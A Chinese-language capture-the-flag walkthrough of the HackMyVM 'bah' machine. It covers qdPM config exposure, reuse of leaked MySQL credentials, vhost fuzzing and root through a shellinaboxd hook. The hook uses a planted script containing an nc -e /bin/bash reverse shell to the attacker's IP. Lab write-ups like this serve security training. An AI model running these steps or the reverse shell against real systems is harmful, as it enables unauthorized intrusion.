
|   |   |   |
|---|---|---|
|bah|easy|qdpmcms利用、mysql利用、host碰撞、shellinaboxd使用、pspy分析隐藏进程提权|


```c
┌──(kali㉿kali)-[~]
└─$ sudo netdiscover -i eth0 -r 192.168.44.141/24
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.141 
```
80 3306
```css
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.44.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,png -e
```

访问80发现是qdPMcms的网站，直接searchsploit
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit qdPM 
qdPM 9.2 - Cross-site Request Forgery (CSR | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthentica | php/webapps/50176.txt

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit -m php/webapps/50176.txt

https://www.exploit-db.com/exploits/50176
http://<website>/core/config/databases.yml
```

下载得到数据库的用户密码http://192.168.44.141/core/config/databases.yml
```c
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qpm;host=localhost'
      profiler: false
      username: qpmadmin
      password: "<?php echo urlencode('qpmpazzw') ; ?>"
      attributes:
        quote_identifier: true  
```

重新安装漏洞http://192.168.44.141/install
但是登陆时候确是404http://192.168.44.141/index.php/login

想到刚开开启的3306端口可以登录数据库
```c
                                                                             
┌──(kali㉿kali)-[~]
└─$ mysql -uqpmadmin -pqpmpazzw -h192.168.44.141     
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 58
Server version: 10.5.11-MariaDB-1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hidden             |
| information_schema |
| mysql              |
| performance_schema |
| qpm                |
+--------------------+
5 rows in set (0.003 sec)

MariaDB [(none)]> use hidden
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [hidden]> show tables;
+------------------+
| Tables_in_hidden |
+------------------+
| url              |
| users            |
+------------------+
2 rows in set (0.002 sec)

MariaDB [hidden]> select * from users;
+----+---------+---------------------+
| id | user    | password            |
+----+---------+---------------------+
|  1 | jwick   | Ihaveafuckingpencil |
|  2 | rocio   | Ihaveaflower        |
|  3 | luna    | Ihavealover         |
|  4 | ellie   | Ihaveapassword      |
|  5 | camila  | Ihaveacar           |
|  6 | mia     | IhaveNOTHING        |
|  7 | noa     | Ihaveflow           |
|  8 | nova    | Ihavevodka          |
|  9 | violeta | Ihaveroot           |
+----+---------+---------------------+
9 rows in set (0.002 sec)

MariaDB [hidden]> select * from url;
+----+-------------------------+
| id | url                     |
+----+-------------------------+
|  1 | http://portal.bah.hmv   |
|  2 | http://imagine.bah.hmv  |
|  3 | http://ssh.bah.hmv      |
|  4 | http://dev.bah.hmv      |
|  5 | http://party.bah.hmv    |
|  6 | http://ass.bah.hmv      |
|  7 | http://here.bah.hmv     |
|  8 | http://hackme.bah.hmv   |
|  9 | http://telnet.bah.hmv   |
| 10 | http://console.bah.hmv  |
| 11 | http://tmux.bah.hmv     |
| 12 | http://dark.bah.hmv     |
| 13 | http://terminal.bah.hmv |
+----+-------------------------+
13 rows in set (0.002 sec)

MariaDB [hidden]> 

```

# host碰撞

使用host碰撞工具获取访问域名，记得在HostCollision-2.2.8/dataSource/下配置好域名和ip
```c
┌──(kali㉿kali)-[~/Desktop/红队工具/HostCollision-2.2.8]
└─$ java -jar HostCollision.jar
```


或者使用wfuzz 进行碰撞
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ wfuzz -c -w url -u 192.168.44.141 -H "HOST: FUZZ"

000000005:   200        0 L      1 W        46 Ch       "party.bah.hmv - party.bah.hmv"
```

host绑定后访问这个域名
```c
sudo vim /etc/hosts

使用这个用户密码ssh|  2 | rocio   | Ihaveaflower        |
使用上面的密码获取一个web 版的ssh（shellinabox：一款使用 AJAX 的基于 Web 的终端模拟器）

rocio@bah:~$ cat user.txt                                                    
HdsaMoiuVdsaeqw                                                              

su qpmadmin //qpmpazzw

```

# 提权
上传pspy64查看root进程
```c
qpmadmin@bah:~$ wget http://192.168.44.128:1234/pspy64
--2024-04-19 03:13:46--  http://192.168.44.128:1234/pspy64                   
Connecting to 192.168.44.128:1234... connected.                              
HTTP request sent, awaiting response... 200 OK                               
Length: 3104768 (3.0M)                                                       
Saving to: ‘pspy64’                                                          
                                                                             
pspy64              100%[================>]   2.96M  --.-KB/s    in 0.1s     
                                                                             
2024-04-19 03:13:46 (28.6 MB/s) - ‘pspy64’ saved [3104768/3104768]           
                                                                             
qpmadmin@bah:~$ ls                                                           
pspy64                                                                       
qpmadmin@bah:~$ chmod +x pspy64                                              
qpmadmin@bah:~$ ./pspy64                                                     
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
                                                                             
                                                                             
     ██▓███    ██████  ██▓███ ▓██   ██▓                                      
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                      
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                      
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                      
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                      
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                       
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                       
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                        
                   ░           ░ ░                                           
                               ░ ░                                           
                                                                             
Config: Printing events (colored=true): processes=true | file-system-events=f
alse ||| Scanning for processes every 100ms and on inotify events ||| Watchin
g directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursi
ve)                                                                          
Draining file system events due to startup...                                
done                                                                         
2024/04/19 03:14:06 CMD: UID=1001  PID=996    | ./pspy64 
2024/04/19 03:14:06 CMD: UID=0     PID=993    | 
2024/04/19 03:14:06 CMD: UID=1001  PID=930    | bash 
2024/04/19 03:14:06 CMD: UID=0     PID=929    | su qpmadmin 
2024/04/19 03:14:06 CMD: UID=1000  PID=910    | -bash 
2024/04/19 03:14:06 CMD: UID=1000  PID=905    | (sd-pam) 
2024/04/19 03:14:06 CMD: UID=1000  PID=903    | /lib/systemd/systemd --user 
2024/04/19 03:14:06 CMD: UID=0     PID=897    | login -p -h 127.0.0.1 
2024/04/19 03:14:06 CMD: UID=0     PID=881    | 
2024/04/19 03:14:06 CMD: UID=0     PID=858    | dhclient ens33 
2024/04/19 03:14:06 CMD: UID=0     PID=854    | 
2024/04/19 03:14:06 CMD: UID=0     PID=659    | dhclient ens33 
2024/04/19 03:14:06 CMD: UID=0     PID=638    | dhclient ens33 
2024/04/19 03:14:06 CMD: UID=0     PID=634    | -bash 
2024/04/19 03:14:06 CMD: UID=0     PID=629    | (sd-pam) 
2024/04/19 03:14:06 CMD: UID=0     PID=628    | /lib/systemd/systemd --user 
2024/04/19 03:14:06 CMD: UID=106   PID=556    | /usr/sbin/mariadbd 
2024/04/19 03:14:06 CMD: UID=33    PID=537    | php-fpm: pool www            
                                                                             
2024/04/19 03:14:06 CMD: UID=33    PID=536    | php-fpm: pool www            
                                                                             
2024/04/19 03:14:06 CMD: UID=33    PID=530    | nginx: worker process        
                                                                             
2024/04/19 03:14:06 CMD: UID=0     PID=524    | nginx: master process /usr/sb
in/nginx -g daemon on; master_process on;                                    
2024/04/19 03:14:06 CMD: UID=107   PID=513    | /usr/bin/shellinaboxd -q --ba
ckground=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellin
abox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabl
ed/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_
White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color 
Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css -
-no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/
dev                                                                          
2024/04/19 03:14:06 CMD: UID=107   PID=511    | /usr/bin/shellinaboxd -q --ba
ckground=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellin
abox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabl
ed/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_
White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color 
Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css -
-no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/
dev                                                                          
2024/04/19 03:14:06 CMD: UID=0     PID=472    | 
2024/04/19 03:14:06 CMD: UID=0     PID=468    | /bin/login -p --      
2024/04/19 03:14:06 CMD: UID=0     PID=448    | /lib/systemd/systemd-logind 
2024/04/19 03:14:06 CMD: UID=0     PID=443    | /usr/sbin/rsyslogd -n -iNONE 
2024/04/19 03:14:06 CMD: UID=0     PID=440    | php-fpm: master process (/etc
/php/7.4/fpm/php-fpm.conf)                                                   
2024/04/19 03:14:06 CMD: UID=104   PID=430    | /usr/bin/dbus-daemon --system
 --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only  
2024/04/19 03:14:06 CMD: UID=0     PID=429    | /usr/sbin/cron -f 
2024/04/19 03:14:06 CMD: UID=101   PID=401    | /lib/systemd/systemd-timesync
d                                                                            
2024/04/19 03:14:06 CMD: UID=0     PID=384    | 
```
这里可以看到一个shellinaboxd的命令。 -s 是用于启动服务。程序中的/devel将由用户root调用目标机器的/tmp/dev。因此，我们可以在 /tmp 上创建一个名为“dev”的可执行脚本，这将为我们提供一个反向 shell。
```c
qpmadmin@bah:/tmp$ nano dev                                                                                                                                      
qpmadmin@bah:/tmp$ cat dev                                                                
#!/bin/bash                                                 
nc -e /bin/bash 192.168.44.128 9001                                                                                                                              
qpmadmin@bah:/tmp$ chmod +x dev           
```
kali上监听，访问http://party.bah.hmv/devel/即可！！！
cat /root/root.txt
HMVssssshell323
